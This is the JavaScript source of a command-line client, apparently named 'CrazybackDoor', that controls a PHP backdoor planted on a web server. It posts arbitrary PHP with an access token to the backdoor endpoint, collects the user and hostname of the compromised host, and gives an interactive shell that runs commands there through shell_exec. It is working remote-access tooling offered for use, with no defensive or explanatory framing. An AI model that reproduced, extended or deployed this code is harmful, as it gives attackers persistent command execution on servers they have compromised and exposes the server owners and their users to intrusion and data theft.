const term = require('terminal-kit').terminal,
	termkit = require('terminal-kit'),
	parse = require('shell-parse'),
	glob = require('glob'),
	axios = require('axios'),
	qs = require('qs'),
    path = require('path');

class Shell{

	constructor(){
		this.commands = [];
		glob('./commands/*.js', (err, file) => {
			this.commands = file;
		});

		term.on('key', (key) => {
			if (key === 'CTRL_C'){
				this.input();
			}
		});
	}

	async init(host, token) {
		if (await this.auth(host, token)) {
			this.welcomeScreen();
			this.input();
		}
	}

	welcomeScreen(){
		term.white('\nWelcome on ').bold.red('CrazybackDoor').white(' client!\n');
		term.white('You are connecting from : ').blue(this.entrypoint+'\n\n');
	}

	async auth(host, token){
		term.blue('Connecting...\n');
		this.entrypoint = host;
		this.token = token;

		let data = await this.php(`return array(
				'sucess' => true, 
				'pwd' => $_SERVER['DOCUMENT_ROOT'],
				'whoami' => exec('whoami'),
				'hostname' => gethostname()
		);`);

        this.user = data.whoami;
        this.hostname = data.hostname;

		if(data.sucess !== true){
			term.red('Connection failed.');
			this.quit();
			return false;
		}
		this.pwd = data.pwd;
		return true;
	}

	ps1() {
		term.white(  '╭─').bold.red(`${this.user}@${this.hostname} `).blue(this.pwd);
		term.white("\n╰─$ ");
	}

	input(){
		this.ps1();

		term.inputField({
			autoComplete : (input, callback) => {
				let returns = [];
				if(input.match(/^([a-zA-Z0-9]+)$/)){
					returns = this.commands.map(file => path.basename(file, path.extname(file)));
				}

				callback( undefined , termkit.autoComplete(returns, input, true));
			},
			autoCompleteHint: true,
			autoCompleteMenu: true,
		} ,
		( error , raw ) => {
			term('\n');
			let input = parse(raw);

			input.forEach((expression) => {
				this.runExpression(expression, raw);
			});
		});
	}

	async runExpression(expression, raw) {
		let module = './commands/'+expression.command.value;
		try {
			delete require.cache[require.resolve(module)];
			let cmd = require(module);
			await cmd.exec(expression, raw, this);
		} catch (e) {
			term.red('command not found: ' + expression.command.value);
			term('\n');
			this.input();
		}
	}

	async call(c){
        const res = await axios.post(this.entrypoint, qs.stringify({
            'c' : c,
            'p' : this.token
        }));
        return res.data;
	}

	async php(request){
		const response = await this.call(`ob_clean();
			header('Content-Type: application/json');
			function crazyexec(){`+request+`}
			echo json_encode(array(
				'result' => crazyexec(),
			));
			exit;`);
		return response.result;
	}

	async stream(request){
		const result = await axios.post(this.entrypoint, qs.stringify({
			'c' : request+` echo 'end'; exit;`,
			'p' : this.token
		}), {
			responseType:'stream'
		});
		console.log(result);
		return result;
	}

	async sh(cmd, input, after=''){
		let args = input.args.map(i => i.value).join(' ');

		/*return await this.stream(`
			error_reporting(E_ALL);
			ini_set('display_errors', 1);
			$cmd = '`+cmd+` `+args+` `+after+`';

			$descriptorspec = array(
			   0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
			   1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
			   2 => array("pipe", "w")    // stderr is a pipe that the child will write to
			);
			flush();
			$process = proc_open($cmd, $descriptorspec, $pipes, '`+this.pwd+`', array());
			if (is_resource($process)) {
			    while ($s = fgets($pipes[1])) {
			        print $s;
			        flush();
			    }
			}`);*/
		return await this.php(`return shell_exec("cd `+this.pwd+` && `+cmd+` `+args+` `+after+`");`);
	}

	quit(){
		term.red('\nQuitting... Bye\n');
		term.grabInput(false);
		process.exit();
	}
}

module.exports = Shell;